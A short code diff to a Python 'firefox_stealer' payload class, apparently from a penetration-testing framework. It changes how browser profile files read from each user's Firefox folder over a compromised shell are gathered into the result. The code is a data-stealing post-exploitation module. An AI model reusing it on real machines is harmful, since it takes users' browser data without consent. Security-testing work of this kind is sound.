@@ -9,7 +9,6 @@ class firefox_stealer(base_payload):
     '''
     def api_read(self):
         result = {}
-        result['files'] = {}
         files = []
 
         files.append('bookmarks.html')
@@ -29,7 +28,7 @@ class firefox_stealer(base_payload):
             if path:
                 return path
             else:
-                return ''
+                return []
 
         users_folders = self.exec_payload('users_name').values()
         for users in users_folders:
@@ -39,12 +38,12 @@ class firefox_stealer(base_payload):
                     for file in files:
                         content = self.shell.read(users+'.mozilla/firefox/'+folder+'/'+file)
                         if content:
-                            result['files'].update({users+'.mozilla/firefox/'+folder+'/'+file:content})
+                            result.update({users+'.mozilla/firefox/'+folder+'/'+file:content})
 
         for file in files:
             content = self.shell.read(file)
             if content:
-                result['files'].update({file:content})
+                result.update({file:content})
 
         return result
     
